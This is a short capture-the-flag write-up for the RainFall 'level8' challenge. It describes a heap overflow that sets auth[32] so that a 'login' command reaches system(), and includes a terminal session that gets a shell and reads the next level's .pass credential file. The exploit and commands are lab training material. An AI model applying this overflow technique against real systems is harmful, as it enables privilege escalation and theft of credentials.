After reversing level8 I understand my goal is to pass all the conditions to call system()
It's like the program was not finished, it asks for a password but doesn't get it.
It allocates 4 bytes but copy all the string to auth

To call system() we need to fulfill the condition that checks we entered login as a command and auth[32] != 0

1) We need to enter "auth max" to get auth pointing to some memory
2) Enter "serviceaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" (lot of char) to be sure auth[32] is set
3) enter "login" and then get the .pass


As ASLR is disabled all malloc() calls will return consecutive addresses

level8@RainFall:~$ ./level8
(nil), (nil)
auth max
0x804a008, (nil)
serviceaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
0x804a008, 0x804a018
login
$ whoami
level9
$ cat /home/user/level9/.pass
